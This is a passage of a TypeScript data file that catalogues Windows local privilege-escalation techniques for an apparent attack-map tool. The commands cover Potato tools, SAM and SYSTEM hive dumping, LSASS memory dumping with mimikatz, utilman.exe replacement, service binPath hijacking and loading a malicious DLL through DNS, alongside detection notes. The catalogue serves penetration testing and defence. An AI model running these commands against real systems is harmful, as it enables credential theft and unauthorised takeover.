import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { range } from '../windows-versions';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Windows local privilege-escalation techniques (web-verified).
 *
 * Shaped as the operator's triage tree (see windows-pe.ts). The single foothold/triage
 * node forks by CONTEXT into three lanes:
 *
 * - PRIVILEGED USERS (`hold`): a token privilege (`pe-cat-tokens`) or group membership
 *   (`pe-cat-groups`) you already hold — abuse it directly.
 * - ADMIN USERS (`admin`): already an administrator — bypass UAC (`pe-cat-uac`) to a
 *   high-integrity token, then any Admin -> SYSTEM technique (`pe-cat-admin2sys`).
 * - UNPRIVILEGED USERS (`finding`): no inherent privilege; enumerate for a weakness —
 *   stored creds, service misconfigs, DLL/PATH, tasks/autoruns, app/service abuse,
 *   or a known-CVE exploit.
 *
 * A few shared MECHANISMS (`pe-prim-*`) are where multiple findings converge on SYSTEM.
 * SYSTEM is the goal and the map ends there; post-exploitation (credential dumping,
 * lateral movement) lives in the Active Directory map, not here.
 */
export const peTechniqueNodes: TechniqueNodeDef[] = [
  // ── Lane folders ────────────────────────────────────────────────────────────
  { id: 'pe-cat-priv', label: 'Privileged Users', phase: 'hold', summary: 'A privileged token or group you already hold.', description: 'The account already holds something dangerous — an abusable token privilege or membership in a powerful local group. No hunting required: abuse the right you have.' },
  { id: 'pe-cat-admin', label: 'Admin Users', phase: 'admin', summary: 'Already a local admin, at medium (UAC-filtered) or high integrity.', description: 'The account is in the local Administrators group. If UAC filters it to a medium-integrity token, bypass UAC to obtain the high-integrity token; once high-integrity, any administrator-to-SYSTEM technique applies.' },
  { id: 'pe-cat-enum', label: 'Unprivileged Users', phase: 'finding', summary: 'No inherent privilege — enumerate for a weakness.', description: 'The account holds no useful privilege, group, or admin membership. Enumerate the host (winPEAS / PrivescCheck) and work the findings: stored credentials, service and DLL/PATH misconfigurations, tasks and autoruns, privileged app/service abuse, and known-CVE exploits.' },

  // ── Sub-folders: Privileged Users ───────────────────────────────────────────
  { id: 'pe-cat-tokens', label: 'Token Privileges', phase: 'hold', kind: 'category', summary: 'whoami /priv — abusable token privileges.', description: 'Dangerous privileges surfaced by whoami /priv: SeImpersonate / SeAssignPrimaryToken, SeBackup / SeRestore, SeDebug, SeTakeOwnership, SeLoadDriver, SeManageVolume, SeTrustedCredManAccess, SeCreateToken, SeTcb, and SeRelabel.' },
  { id: 'pe-cat-groups', label: 'Local Group Membership', phase: 'hold', kind: 'category', summary: 'whoami /groups — privileged group membership.', description: 'Membership in a local or built-in group whose rights convert to SYSTEM or credential theft: Backup / Server / Print Operators, DnsAdmins, Hyper-V Administrators, Event Log Readers, Account Operators, or a UAC-filtered Administrators token.' },

  // ── Sub-folders: Admin Users ────────────────────────────────────────────────
  { id: 'pe-cat-uac', label: 'UAC Bypass', phase: 'admin', kind: 'category', summary: 'Raise a UAC-filtered (medium-integrity) admin token to high integrity, no consent prompt.', description: 'With UAC enabled, an administrator runs under a split token: a filtered medium-integrity token for everyday use, and the full high-integrity token only after a consent prompt. A bypass abuses an auto-elevating, Microsoft-signed binary or scheduled task to obtain the high-integrity token silently. It raises integrity, not privilege, so it applies only to an account that is already a local administrator; a standard user gains nothing. UACMe catalogues ~70 methods; the map lists the common ones.' },
  { id: 'pe-cat-admin2sys', label: 'Elevate to SYSTEM', phase: 'admin', kind: 'category', summary: 'Pivot from a high-integrity administrator token to NT AUTHORITY\\SYSTEM.', description: 'With a high-integrity administrator token, obtain a SYSTEM context: install or reconfigure a service to run as LocalSystem, register a scheduled task that runs as SYSTEM, or duplicate the token of an existing SYSTEM process.' },

  // ── Sub-folders: Unprivileged Users ─────────────────────────────────────────
  { id: 'pe-cat-creds', label: 'Stored Credentials', phase: 'finding', kind: 'category', summary: 'Reusable secrets on disk, in the registry, and in memory.', description: 'Credentials you can replay as a more privileged user — registry and memory secrets, DPAPI, autologon and saved credentials, PowerShell history, files and configs, and password-manager / browser stores. winPEAS and LaZagne automate most of these.' },
  { id: 'pe-cat-services', label: 'Service Misconfigurations', phase: 'finding', kind: 'category', summary: 'Weak service ACLs, paths, binaries, and registry keys.', description: 'A SYSTEM service you can influence — a weak binPath ACL, an unquoted path, a writable binary, or a writable service registry key — so you choose what it runs.' },
  { id: 'pe-cat-dll', label: 'DLL & PATH Hijacking', phase: 'finding', kind: 'category', summary: 'Privileged process loads a DLL you control.', description: 'A privileged process resolves a DLL by name from a location you can write to — a hijackable service DLL, or a user-writable directory on the system PATH.' },
  { id: 'pe-cat-tasks', label: 'Scheduled Tasks & Autoruns', phase: 'finding', kind: 'category', summary: 'Writable code a privileged context runs automatically.', description: 'A binary or script a higher-privileged context launches on a schedule or at logon is writable by you — overwrite it and wait for, or invoke, the trigger.' },
  { id: 'pe-cat-apps', label: 'Privileged App & Service Abuse', phase: 'finding', kind: 'category', summary: 'Abuse a privileged local app or service.', description: 'Leverage an application or service running at higher privilege: a local MSSQL instance, vulnerable third-party software with a known LPE, an exploitable privileged service (PrintNightmare), an admin-run GUI you can break out of, or the Windows Installer when the AlwaysInstallElevated policy lets any user install an MSI as SYSTEM.' },
  { id: 'pe-cat-cve', label: 'Known Exploits (CVE)', phase: 'finding', kind: 'category', summary: 'Run a public exploit for an unpatched CVE.', description: 'When config and credentials are clean, run a public local-privilege-escalation exploit — kernel and driver CVEs plus a few famous non-kernel one-shots. Map the build and hotfixes first; loud and best on older, unpatched hosts.' },

  // ── Token Privileges (whoami /priv) ─────────────────────────────────────────
  {
    id: 'pe-localservice-fullpowers',
    label: 'Restore Service Account Privileges',
    phase: 'hold',
    summary: 'Restore a stripped service token to its default privileges, including SeImpersonate.',
    affects: 'Works on Windows 10 / Server 2016 to 2019. Unreliable on Windows 11 / Server 2022 and later, where the scheduled-task privilege behaviour changed. If the account already holds SeImpersonate, skip this and go straight to a Potato (GodPotato needs only that privilege).',
    versions: [...range('win10-1507', 'win10-22h2'), 'srv2016', 'srv2019'],
    description: r`A service running as LOCAL SERVICE or NETWORK SERVICE often starts with a heavily filtered token that is missing SeImpersonatePrivilege. The account's default privilege set can be restored by relaunching through the Task Scheduler, whose tasks receive the full set when RequiredPrivileges is absent, handing back SeImpersonate / SeAssignPrimaryToken so a Potato attack becomes possible again. itm4n's FullPowers automates this, but it was archived in 2024 and is unreliable on Windows 11 / Server 2022 and later. Treat the tool as one option, not the technique itself.`,
    tools: [{ name: 'FullPowers', url: 'https://github.com/itm4n/FullPowers' }],
    commands: [
      { label: 'Recover the default privileges', code: r`FullPowers.exe -c "C:\Temp\payload.exe" -z`, lang: 'cmd' },
      { label: 'Confirm SeImpersonate is back', code: r`whoami /priv`, lang: 'cmd' },
    ],
    mitre: mitre('T1134'),
    references: [{ label: 'itm4n — Give Me Back My Privileges', url: 'https://itm4n.github.io/localservice-privileges/' }],
    requires: ['Code execution as LOCAL SERVICE / NETWORK SERVICE', 'Task Scheduler reachable'],
    opsec: 'Spawns a scheduled-task-hosted process; the recovered token then runs Potato tooling, which EDR signatures heavily.',
    difficulty: 'medium',
  },
  {
    id: 'pe-seimpersonate-potato',
    label: 'SeImpersonate / SeAssignPrimaryToken',
    phase: 'hold',
    hub: true,
    summary: 'Hold an impersonation privilege, then pick a Potato variant by Windows build.',
    affects: 'The privilege exists on every version; the working tool is build-specific. JuicyPotato up to Win10 1803 / Server 2016, RoguePotato and PrintSpoofer for 1809 / Server 2019 and later, GodPotato across Windows 8 to 11 and Server 2012 to 2022.',
    description: r`Service accounts (IIS, MSSQL, a relayed login) and many others hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. The "Potato" family coerces a SYSTEM-level authentication or RPC call and impersonates the returned token to run code as NT AUTHORITY\SYSTEM. Every variant needs the same privilege; what changes is the coercion trick, which Microsoft has patched piecemeal. Confirm the privilege, then choose the variant that fits the target build and the services it is running.`,
    commands: [{ label: 'Confirm the privilege', code: r`whoami /priv`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'itm4n, abusing impersonation privileges', url: 'https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/' },
      { label: 'jlajara, Potatoes (Windows privesc)', url: 'https://jlajara.gitlab.io/Potatoes_Windows_Privesc' },
    ],
    requires: ['SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege'],
    opsec: 'Potato binaries are heavily signatured by EDR/AV, and each variant has its own tell (a Spooler named pipe, outbound port 135, a DCOM activation).',
    difficulty: 'easy',
  },
  {
    id: 'pe-pot-juicypotato',
    label: 'JuicyPotato',
    phase: 'hold',
    summary: 'Abuse a SYSTEM DCOM/BITS CLSID for a SYSTEM token (legacy, pre-1809).',
    affects: 'Windows 7 through 10 1803 and Server 2008 through 2016. Broke on Windows 10 1809 / Server 2019, where the DCOM OXID resolver change removed the local trick.',
    versions: [...range('win7', 'win10-1803'), 'srv2008', 'srv2012', 'srv2016'],
    description: r`The original local-only Potato. Abuse a SYSTEM-owned DCOM server (BITS and others) by pointing its OXID resolution at a local listener, capture the SYSTEM NTLM authentication, and impersonate it. Needs a CLSID that runs as SYSTEM on the target build; the project ships a per-OS CLSID list. No network egress, so it is still the first pick on older hosts.`,
    tools: [
      { name: 'JuicyPotato', url: 'https://github.com/ohpe/juicy-potato' },
      { name: 'CLSID lists', url: 'https://ohpe.it/juicy-potato/CLSID/' },
    ],
    commands: [
      { label: 'Run with a SYSTEM CLSID for the OS', code: r`JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [{ label: 'jlajara, Potatoes', url: 'https://jlajara.gitlab.io/Potatoes_Windows_Privesc' }],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A DCOM CLSID that runs as SYSTEM on the target build'],
    opsec: 'A fake DCOM/OXID listener on a local port plus a burst of local NTLM is detectable, and the binary is widely signatured.',
    difficulty: 'easy',
  },
  {
    id: 'pe-pot-printspoofer',
    label: 'PrintSpoofer',
    phase: 'hold',
    summary: 'Coerce the Print Spooler over a named pipe for a SYSTEM token.',
    affects: 'Windows 10/11 and Server 2016 to 2022 wherever the Print Spooler service runs. Fails when Spooler is disabled, which is common post-PrintNightmare hardening.',
    versions: [...range('win10-1507', 'win11-24h2'), 'srv2016', 'srv2019', 'srv2022'],
    description: r`itm4n's replacement for JuicyPotato on 1809 and later. Make the Print Spooler service connect to a named pipe you control, then impersonate the SYSTEM token that arrives. Entirely local with no network redirector, which makes it the simplest option when the Spooler is running.`,
    tools: [{ name: 'PrintSpoofer', url: 'https://github.com/itm4n/PrintSpoofer' }],
    commands: [{ label: 'SYSTEM shell via the Spooler pipe', code: r`PrintSpoofer.exe -i -c cmd.exe`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'itm4n, PrintSpoofer', url: 'https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/' }],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'Print Spooler service running'],
    opsec: 'Named-pipe Spooler coercion and the binary are signatured; many hardened hosts disable the Spooler entirely.',
    difficulty: 'easy',
  },
  {
    id: 'pe-pot-roguepotato',
    label: 'RoguePotato',
    phase: 'hold',
    summary: 'Redirect the DCOM OXID resolver to a remote listener (post-1809).',
    affects: 'Windows 10 1809 and later, Server 2019 and later. Needs a machine you control reachable on port 135 to host the OXID redirector.',
    versions: [...range('win10-1809', 'win11-24h2'), 'srv2019', 'srv2022'],
    description: r`Revives the JuicyPotato approach on builds where the local OXID trick was patched. Point DCOM OXID resolution at a remote redirector on port 135, which forwards back to a local socket, capture the SYSTEM authentication, and impersonate it. The remote port-135 requirement is its main constraint.`,
    tools: [{ name: 'RoguePotato', url: 'https://github.com/antonioCoco/RoguePotato' }],
    commands: [
      { label: 'On your redirector (forward 135 to the target)', code: r`socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999`, lang: 'bash' },
      { label: 'On the target', code: r`RoguePotato.exe -r <redirector_ip> -e "cmd.exe" -l 9999`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [{ label: 'RoguePotato (antonioCoco)', url: 'https://github.com/antonioCoco/RoguePotato' }],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A redirector reachable on port 135'],
    opsec: 'Outbound 135 to an external host is unusual on a workstation and stands out; the binary is signatured.',
    difficulty: 'medium',
  },
  {
    id: 'pe-pot-godpotato',
    label: 'GodPotato',
    phase: 'hold',
    summary: 'rpcss OXID flaw covering Windows 8 to 11 and Server 2012 to 2022.',
    affects: 'Windows 8 through 11 and Server 2012 through 2022, per the project. Local-only, with no redirector or Spooler dependency, which makes it the current default.',
    versions: [...range('win8', 'win11-24h2'), 'srv2012', 'srv2016', 'srv2019', 'srv2022'],
    description: r`The current go-to. A DCOM-based coercion that abuses how the rpcss service handles OXID resolution, working across nearly every supported build with no network redirector and no Print Spooler dependency. Ship the .NET-version-matched binary (NET2 / NET3.5 / NET4) for the target.`,
    tools: [{ name: 'GodPotato', url: 'https://github.com/BeichenDream/GodPotato' }],
    commands: [{ label: 'SYSTEM command (match .NET to the host)', code: r`GodPotato-NET4.exe -cmd "cmd /c whoami"`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'GodPotato (BeichenDream)', url: 'https://github.com/BeichenDream/GodPotato' }],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A matching .NET runtime on the host'],
    opsec: 'DCOM activation plus a local NTLM coercion; the binary is signatured, though the local-only footprint is quieter than RoguePotato.',
    difficulty: 'easy',
  },
  {
    id: 'pe-sebackup-restore',
    label: 'SeBackup / SeRestore',
    phase: 'hold',
    summary: 'Read protected files (SAM/SYSTEM, NTDS) bypassing ACLs.',
    affects: 'All supported Windows versions (privilege model).',
    description: r`SeBackupPrivilege grants read access to any file regardless of its ACL; SeRestorePrivilege grants write. On a workstation/server, copy out the SAM and SYSTEM hives for offline hash extraction. On a Domain Controller, use diskshadow (VSS) + robocopy /b to exfiltrate ntds.dit and dump every domain hash.`,
    tools: [
      { name: 'diskshadow', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow' },
      { name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' },
    ],
    commands: [
      { label: 'Copy SAM + SYSTEM hives', code: r`reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
      { label: 'Extract hashes offline', code: r`impacket-secretsdump -sam sam.hive -system system.hive LOCAL`, lang: 'bash' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'HackTricks — Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }],
    requires: ['SeBackupPrivilege (and SeRestorePrivilege for write paths)'],
    opsec: 'reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.',
    difficulty: 'medium',
  },
  {
    id: 'pe-sedebug-lsass',
    label: 'SeDebug',
    phase: 'hold',
    summary: 'Open LSASS / steal a SYSTEM token.',
    affects: 'All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.',
    description: r`SeDebugPrivilege lets you open a handle to processes owned by other users, including LSASS. Dump LSASS memory (procdump, comsvcs MiniDump, or mimikatz) to extract cached credentials, or open a SYSTEM process and duplicate its token directly. Effectively SYSTEM-equivalent.`,
    tools: [
      { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'ProcDump (Sysinternals)', url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump' },
    ],
    commands: [
      { label: 'comsvcs MiniDump (LOLBAS)', code: r`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Temp\lsass.dmp full`, lang: 'cmd' },
      { label: 'Parse offline with mimikatz', code: r`sekurlsa::minidump C:\Temp\lsass.dmp
sekurlsa::logonpasswords`, lang: 'cmd' },
    ],
    mitre: mitre('T1003.001'),
    references: [{ label: 'LOLBAS — comsvcs.dll', url: 'https://lolbas-project.github.io/lolbas/Libraries/comsvcs/' }],
    requires: ['SeDebugPrivilege (effectively admin/SYSTEM-equivalent)'],
    opsec: 'LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.',
    difficulty: 'medium',
  },
  {
    id: 'pe-setakeownership',
    label: 'SeTakeOwnership',
    phase: 'hold',
    summary: 'Take ownership of a SYSTEM binary, then replace it.',
    affects: 'All supported Windows versions (privilege model).',
    description: r`SeTakeOwnershipPrivilege lets you become the owner of any object. Take ownership of a binary that auto-runs as SYSTEM (classic: C:\Windows\System32\utilman.exe or sethc.exe), grant yourself write, and replace it. Trigger it from the logon screen (Ease of Access / Sticky Keys) to get a SYSTEM shell.`,
    tools: [
      { name: 'takeown (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown' },
      { name: 'icacls (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls' },
    ],
    commands: [
      { label: 'Take ownership + grant write', code: r`takeown /f C:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant %USERNAME%:F`, lang: 'cmd' },
      { label: 'Replace with cmd, trigger at lock screen', code: r`copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1548'),
    references: [{ label: 'HackTricks — Abusing Tokens', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html' }],
    requires: ['SeTakeOwnershipPrivilege', 'Ability to reach the logon screen (for the utilman/sethc trigger)'],
    opsec: 'Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.',
    difficulty: 'medium',
  },
  {
    id: 'pe-seloaddriver',
    label: 'SeLoadDriver',
    phase: 'hold',
    summary: 'Load a vulnerable signed driver, exploit it for kernel code exec.',
    affects: 'All versions if held, but HVCI and the Microsoft driver-blocklist on Win10/11 and Server 2022+ block most vulnerable drivers.',
    description: r`SeLoadDriverPrivilege allows loading kernel-mode drivers. Use EoPLoadDriver to enable the privilege and register a service key under HKCU, then NtLoadDriver a known-vulnerable signed driver (e.g. Capcom.sys) and exploit its arbitrary-kernel-exec to elevate to SYSTEM (a BYOVD pattern).`,
    tools: [
      { name: 'EoPLoadDriver', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' },
      { name: 'ExploitCapcom', url: 'https://github.com/tandasat/ExploitCapcom' },
    ],
    commands: [
      { label: 'Register + load the driver', code: r`EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'Tarlogic — Abusing SeLoadDriverPrivilege', url: 'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/' }],
    requires: ['SeLoadDriverPrivilege (held by e.g. Print Operators)'],
    opsec: 'Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.',
    difficulty: 'hard',
  },
  {
    id: 'pe-semanagevolume',
    label: 'SeManageVolume',
    phase: 'hold',
    summary: 'Abuse volume privilege to gain write on C:\\, then DLL hijack.',
    affects: 'All supported Windows versions (privilege model).',
    description: r`SeManageVolumePrivilege can be abused (via the public SeManageVolumeExploit) to obtain full write access over the C:\ drive, including C:\Windows\System32. With that, plant a malicious DLL that a SYSTEM process loads (e.g. tzres.dll triggered by systeminfo, or PrintConfig.dll via PrintNotify) to execute as SYSTEM.`,
    tools: [{ name: 'SeManageVolumeExploit', url: 'https://github.com/CsEnox/SeManageVolumeExploit' }],
    commands: [
      { label: 'Grant write over C:\\ (then DLL hijack)', code: r`SeManageVolumeExploit.exe`, lang: 'cmd' },
    ],
    mitre: mitre('T1574.001'),
    requires: ['SeManageVolumePrivilege', 'A SYSTEM process that loads a writable/missing DLL to trigger'],
    opsec: 'Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32).',
    difficulty: 'hard',
  },
  {
    id: 'pe-setrustedcredman',
    label: 'SeTrustedCredManAccess',
    phase: 'hold',
    summary: 'Back up and decrypt every Credential Manager secret.',
    affects: 'All supported Windows versions if the privilege is held (Winlogon by default; rarely delegated).',
    description: r`SeTrustedCredManAccessPrivilege ("Access Credential Manager as a trusted caller") is held by Winlogon by default. With it, enable the privilege, impersonate the Winlogon token, call CredBackupCredentials to export the user's Credential Manager store, then decrypt it with CryptUnprotectData — recovering saved passwords for escalation or lateral movement.`,
    tools: [
      { name: 'forkatz', url: 'https://github.com/Barbarisch/forkatz' },
      { name: 'BackupCreds', url: 'https://github.com/leftp/BackupCreds' },
    ],
    mitre: mitre('T1555.004'),
    references: [{ label: "Tyranid's Lair — Dumping Stored Credentials", url: 'https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html' }],
    requires: ['SeTrustedCredManAccessPrivilege in the token'],
    opsec: 'Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.',
    difficulty: 'hard',
  },
  {
    id: 'pe-secreatetoken',
    label: 'SeCreateToken',
    phase: 'hold',
    summary: 'Call NtCreateToken to forge a token with a privileged group SID.',
    affects: 'All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).',
    description: r`SeCreateTokenPrivilege lets you build a token by hand with NtCreateToken. You cannot simply mint a usable NT AUTHORITY\SYSTEM token from nothing (naive attempts fail), but you can forge an impersonation token for your own user with a high-privilege group SID added, typically the local Administrators SID, subject to the rule that the forged token's integrity is at or below your process. Impersonate that token to act as a local administrator, then take any Admin to SYSTEM path. Rare, but a direct win when present.`,
    tools: [
      { name: 'daem0nc0re / PrivFu (token-privilege PoCs)', url: 'https://github.com/daem0nc0re/PrivFu' },
      { name: 'Priv2Admin', url: 'https://github.com/gtworek/Priv2Admin' },
    ],
    commands: [
      { label: 'Confirm the privilege', code: r`whoami /priv`, lang: 'cmd' },
      { label: 'Forge an Administrators token, then impersonate it', code: r`:: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.003'),
    references: [
      { label: 'Abusing Token Privileges for LPE (ExploitDB 42556)', url: 'https://www.exploit-db.com/papers/42556' },
      { label: 'Priv2Admin, SeCreateTokenPrivilege', url: 'https://github.com/gtworek/Priv2Admin' },
    ],
    requires: ['SeCreateTokenPrivilege in the token'],
    opsec: 'A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.',
    difficulty: 'hard',
  },
  {
    id: 'pe-setcb',
    label: 'SeTcb',
    phase: 'hold',
    summary: 'Act as part of the OS — craft a privileged token.',
    affects: 'All supported Windows versions if the privilege is held (very rarely granted).',
    description: r`SeTcbPrivilege lets a process act as part of the trusted computing base. Combined with the LSA logon APIs (LsaLogonUser), it can add arbitrary high-privilege SIDs to a token or obtain a SYSTEM-level token, escalating to full control.`,
    mitre: mitre('T1134'),
    references: [{ label: 'Priv2Admin — Windows privilege abuse', url: 'https://github.com/gtworek/Priv2Admin' }],
    requires: ['SeTcbPrivilege in the token'],
    opsec: 'Extremely powerful and rarely granted; abnormal LSA logon calls are detectable.',
    difficulty: 'hard',
  },
  {
    id: 'pe-serelabel',
    label: 'SeRelabel',
    phase: 'hold',
    summary: 'Own a higher-integrity (SYSTEM) object → SYSTEM.',
    affects: 'All supported Windows versions if held (almost never granted); needs a High-integrity context.',
    description: r`SeRelabelPrivilege can modify an object's mandatory integrity label, letting you take ownership of objects at a HIGHER integrity level than your own — including SYSTEM processes. From a High-integrity context, take ownership of a SYSTEM process, grant yourself full control, and create a process as NT AUTHORITY\SYSTEM. Stronger than SeTakeOwnership, but needs High integrity and is almost never granted to users.`,
    mitre: mitre('T1134'),
    references: [{ label: 'Decoder — Abusing the SeRelabelPrivilege', url: 'https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/' }],
    requires: ['SeRelabelPrivilege', 'High-integrity context'],
    opsec: 'A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.',
    difficulty: 'hard',
  },

  // ── Local Group Membership (whoami /groups) ─────────────────────────────────
  {
    id: 'pe-backup-operators',
    label: 'Backup Operators',
    phase: 'hold',
    summary: 'Group grants SeBackup/SeRestore — read SAM/NTDS.',
    affects: 'All supported Windows / Server versions.',
    description: r`Members of the Backup Operators group are granted SeBackupPrivilege and SeRestorePrivilege. Enable them in your token, then read protected hives (SAM/SYSTEM locally, or ntds.dit on a DC via VSS) and dump hashes offline — converging on the same SeBackup/SeRestore tradecraft.`,
    tools: [{ name: 'impacket-secretsdump', url: 'https://github.com/fortra/impacket' }],
    commands: [
      { label: 'Confirm group membership', code: r`whoami /groups | findstr /i "Backup"`, lang: 'cmd' },
      { label: 'Save hives (SeBackup)', code: r`reg save HKLM\SAM C:\Temp\sam.hive & reg save HKLM\SYSTEM C:\Temp\system.hive`, lang: 'cmd' },
    ],
    mitre: mitre('T1003.002'),
    references: [{ label: 'PentestLab — Backup Operator', url: 'https://pentestlab.blog/2024/01/22/domain-escalation-backup-operator/' }],
    requires: ['Membership in Backup Operators', 'Elevated/UAC-cleared token to enable the privileges'],
    opsec: 'The privileges are not enabled by default in a non-elevated token. Same detection profile as SeBackup/SeRestore.',
    difficulty: 'medium',
  },
  {
    id: 'pe-server-operators',
    label: 'Server Operators',
    phase: 'hold',
    summary: 'Reconfigure a DC service binPath to run as SYSTEM.',
    affects: 'All supported Windows Server versions (Domain Controllers).',
    description: r`On Domain Controllers, the Server Operators group can manage services. Reconfigure a SYSTEM service binPath to your command and restart it to execute as SYSTEM on the DC — directly compromising the domain.`,
    tools: [{ name: 'sc (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config' }],
    commands: [
      { label: 'Hijack a service binPath', code: r`sc config <svc> binpath= "net localgroup administrators attacker /add"`, lang: 'cmd' },
      { label: 'Trigger', code: r`sc stop <svc> & sc start <svc>`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [{ label: 'HackingArticles — Server Operator Group', url: 'https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/' }],
    requires: ['Membership in Server Operators (on a DC)', 'Ability to start/stop a target service'],
    opsec: 'sc config + service restart on a DC is high-signal. Restore the original binPath afterward.',
    difficulty: 'medium',
  },
  {
    id: 'pe-dnsadmins',
    label: 'DnsAdmins',
    phase: 'hold',
    summary: 'Load arbitrary DLL into the SYSTEM DNS service.',
    affects: 'All supported Windows Server versions running the DNS role.',
    description: r`Members of DnsAdmins can set the ServerLevelPluginDll value via dnscmd, pointing the DNS service at an arbitrary DLL with no path validation. Restarting the DNS service (often on a DC, running as SYSTEM) loads your DLL as SYSTEM. Highly disruptive — the DNS service may crash.`,
    tools: [
      { name: 'dnscmd (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd' },
      { name: 'msfvenom (Metasploit)', url: 'https://github.com/rapid7/metasploit-framework' },
    ],
    commands: [
      { label: 'Point DNS at a malicious DLL', code: r`dnscmd.exe /config /serverlevelplugindll C:\Temp\adduser.dll`, lang: 'cmd' },
      { label: 'Restart DNS to load it', code: r`sc.exe stop dns & sc.exe start dns`, lang: 'cmd' },
    ],
    mitre: mitre('T1543.003'),
    references: [{ label: 'labofapenetrationtester — Abusing DNSAdmins', url: 'https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html' }],
    requires: ['Membership in DnsAdmins', 'Permission to restart the DNS service'],
    opsec: 'ServerLevelPluginDll write under DNS\\Parameters and DNS.exe spawning a child are strong detections. Disruptive to AD DNS.',
    difficulty: 'medium',
  },
  {
    id: 'pe-hyperv-admins',
    label: 'Hyper-V Administrators',
    phase: 'hold',
    summary: 'Abuse vmms symlink/TOCTOU (CVE-2018-0952 / CVE-2019-0841).',
    affects: 'Unpatched hosts only — CVE-2018-0952 / CVE-2019-0841 (patched 2018–2019).',
    versions: [...range('win10-1607', 'win10-1809'), 'srv2016', 'srv2019'],
    description: r`Hyper-V Administrators can manipulate VM/.vhdx operations performed by vmms.exe as SYSTEM without impersonation. By deleting a .vhdx and planting a hardlink to a protected file, an unpatched host (vulnerable to CVE-2018-0952 / CVE-2019-0841) can be leveraged to gain SYSTEM. Patch-dependent.`,
    mitre: mitre('T1068'),
    references: [{ label: 'decoder.cloud — From Hyper-V Admin to SYSTEM', url: 'https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/' }],
    requires: ['Membership in Hyper-V Administrators', 'Host unpatched for CVE-2018-0952 / CVE-2019-0841'],
    opsec: 'Exploit-specific and version-dependent; only works on unpatched hosts.',
    difficulty: 'hard',
  },
  {
    id: 'pe-print-operators',
    label: 'Print Operators',
    phase: 'hold',
    summary: 'Group holds SeLoadDriverPrivilege — load vulnerable driver.',
    affects: 'Group right is version-independent; the follow-on driver load is limited by HVCI / driver blocklist on modern builds.',
    description: r`The Print Operators group is granted SeLoadDriverPrivilege (to install printer drivers). This is the precondition for the SeLoadDriver → BYOVD path: load a known-vulnerable signed driver and exploit it for kernel-mode code execution as SYSTEM.`,
    tools: [{ name: 'EoPLoadDriver', url: 'https://github.com/TarlogicSecurity/EoPLoadDriver' }],
    commands: [
      { label: 'Confirm group + privilege', code: r`whoami /groups | findstr /i Print
whoami /priv | findstr /i SeLoadDriver`, lang: 'cmd' },
    ],
    mitre: mitre('T1068'),
    references: [{ label: 'Tarlogic — Abusing SeLoadDriverPrivilege', url: 'https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/' }],
